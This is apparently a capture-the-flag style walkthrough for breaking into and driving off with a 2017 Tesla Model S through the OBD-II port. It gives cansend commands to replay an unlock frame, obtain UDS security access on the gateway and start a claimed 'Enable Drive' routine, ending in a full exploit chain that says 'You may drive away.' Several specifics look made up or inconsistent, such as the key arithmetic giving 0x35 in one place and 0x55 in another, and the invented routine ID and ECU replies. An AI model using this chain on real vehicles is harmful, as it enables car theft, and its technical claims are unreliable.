
## **CarPWN: "Tesla Model S (2017) Gateway Bypass"**

**Category:** Hardware Security / Automotive Hacking
**Difficulty:** Hard
**Estimated Time:** 4-6 hours
**Author:** Lacky team
**Year:** 2017
**Target:** Tesla Model S (circa 2017, with firmware version 17.11.3)

#### **Challenge Description**

Welcome, Red Team. Our client, a penetration testing firm, has been tasked with assessing the physical security of a Tesla Model S. The vehicle is located in a secure garage. You have obtained temporary physical access to the vehicle's interior.

Your goal is to gain permanent access to the vehicle by:
1.  **Cloning a Digital Key:** Create a functional clone of the owner's key fob to unlock the doors.
2.  **Defeat Drive Authorization:** Bypass the system that prevents the car from being driven without a recognized key present inside the cabin.

You have connected a laptop to the vehicle's **Diagnostic OBD-II port**. You suspect the critical systems are located on a privileged internal CAN bus.

**Objectives:**
1.  Identify the gateway ECU and access the internal CAN bus.
2.  Sniff and reverse-engineer the door unlock command.
3.  Sniff and reverse-engineer the "Start Drive" command.
4.  (Optional) Identify a vulnerability that allows persistent code execution on the gateway or infotainment system.

**Tools Provided:** A laptop running Kali Linux with `can-utils`, `Wireshark`, and a **SocketCAN-compatible USB-CAN adapter** (e.g., EMS NeoVI, Kvaser, or a cheaper CANable).

---

### **Step-by-Step Solution: The Attack Methodology**

#### **Step 1: Reconnaissance and Mapping the CAN Network**

The first step is to understand the network topology. A Tesla, like most modern cars, has multiple CAN buses (Powertrain, Chassis, Body, Infotainment) connected via a central **Gateway ECU**. The OBD-II port often provides access to a less-critical bus; the goal is to pivot to the internal bus where key commands are sent.

**Actions & Commands:**
1.  **Connect** the USB-CAN adapter to the OBD-II port.
2.  **Bring up the CAN interface:**
    ```bash
    sudo ip link set can0 up type can bitrate 500000
    sudo ifconfig can0 up
    ```
3.  **Start sniffing general traffic** to identify active buses and patterns:
    ```bash
    candump -l can0
    ```
4.  **Analyze the captured log file in Wireshark.** You'll notice a flood of messages. You need to filter for security-relevant commands. Look for messages that appear **infrequently**, likely triggered by a key fob button press.

#### **Step 2: Triggering and Sniffing the Unlock Command**

**Actions & Commands:**
1.  Have an accomplice press the key fob's unlock button while you are sniffing.
2.  Alternatively, press the door handle button to trigger an unlock attempt.
3.  In Wireshark, look for a message that appears exactly once during this event. It might look something like this in `candump` output:
    ```
    can0 2F0   [8]  05 62 00 00 01 A5 C8 11   # Example: Body Control Module ID, Unlock Cmd
    can0 311   [8]  00 00 00 00 00 00 00 00   # Example: Gateway relay message
    ```
4.  **Note the CAN ID and the data payload.** The key is in the data bytes. For example, the byte `01` might indicate "unlock" and `00` might indicate "lock". The other bytes might be a counter or a simple checksum.

#### **Step 3: Spoofing the Unlock Command (Key Cloning)**

Once you've isolated the message, you can replay it to impersonate the key fob.

**Actions & Commands:**
1.  Use `cansend` to inject the captured message back onto the bus:
    ```bash
    cansend can0 2F0#0562000001A5C811
    ```
2.  If the message is correct, you will hear the door locks activate. **Congratulations, you've cloned the key signal.** This is a simple replay attack, proving the system lacks rolling codes or uses a weak implementation.

#### **Step 4: The Hard Part - Bypassing the Drive Authorization**

This is more complex. The vehicle might unlock with a replayed signal, but it won't drive without the key's immobilizer signal inside the car. This is typically done via Passive Keyless Entry (PKE) or a key in the cup holder.

**The Attack Vector: Diagnostic Security Access**
Research at the time showed that the **Gateway ECU** often had diagnostic functions that could be abused.

**Actions & Commands:**
1.  **Find the Diagnostic Session:** You need to talk to the Gateway ECU directly. You need its CAN ID. This was often publicly known or could be found by scanning (e.g., trying to send diagnostic requests to different IDs).
    *   **Standard Diagnostic ID:** Try sending requests to `0x7DF` (broadcast) or known addresses like `0x752` (Gateway).
2.  **Request Security Access:** The Unified Diagnostic Services (UDS) protocol has a `0x27` service for "Security Access". You need to send a seed request and then calculate a key to gain privileged access.
    ```bash
    # Request a seed from the Gateway (UDS Service 0x27, Subfunction 0x01)
    cansend can0 752#0227010000000000
    ```
3.  **Calculate the Key:** The ECU responds with a random seed (e.g., `-`). Many older systems used weak algorithms to generate the key from this seed (e.g., a linear algorithm, or even a fixed response). This algorithm could be reversed from firmware dumps or discovered through research.
    *   *Example:* If the seed is `0x44 0x71`, the key might be `(0x44 XOR 0x71) + 0x20 = 0x15 + 0x20 = 0x35`.
    ```bash
    # Send the calculated key (UDS Service 0x27, Subfunction 0x02)
    cansend can0 752#0227020000003500
    ```
4.  **Send the Malicious Command:** Once security access is granted, you can use other UDS services. The critical one is **Routine Control (`0x31`)** which can start/stop processes.
    *   Research might show that Routine ID `0x0201` is "Enable Drive".
    ```bash
    # Start Routine 0x0201 - "Enable Drive"
    cansend can0 752#0231010201000000
    ```
5.  If successful, the dashboard will show "Ready to Drive", and you will be able to put the car into gear.

### **Full Example of a Successful Exploit Chain**

```bash
# 1. Bring up the interface
sudo ip link set can0 up type can bitrate 500000
sudo ifconfig can0 up

# 2. Sniff and discover the unlock command is: ID 0x2F0, Data: 05 62 00 00 01 A5 C8 11
# 3. Clone the key and unlock the car
cansend can0 2F0#0562000001A5C811

# 4. Get inside the car. Now bypass the immobilizer via the Gateway.
# 5. Request Security Access seed from the Gateway (0x752)
cansend can0 752#0227010000000000
# ECU responds: 752#0327114471000000 (seed = 44 71)

# 6. Calculate the key: (0x44 XOR 0x71) = 0x35; 0x35 + 0x20 = 0x55
cansend can0 752#0227020000005500
# ECU responds: 752#0327120000000000 (positive response!)

# 7. Send the command to enable the drive state
cansend can0 752#0231010201000000

# 8. The car is now in "Ready" state. You may drive away.
```

### **Key Technical Details & Why It Worked (Circa 2017)**

*   **Lack of Rolling Codes:** The key fob signal, once sniffed, could be replayed. Modern systems use cryptographic challenges and responses that change every time.
*   **Insecure Diagnostic Interface:** The Gateway ECU's diagnostic port was accessible from the OBD-II bus and used a weak security algorithm for access control. This allowed attackers to send privileged commands.
*   **Hardcoded Secrets/Routines:** The UDS Routine IDs and the algorithm for calculating the security access key were often hardcoded and identical across many vehicles, making them susceptible to reverse engineering.

<img width="1200" height="900" alt="image" src="https://github.com/user-attachments/assets/fd86bf52-7e6b-44b1-b879-2564e3b8f4e5" />
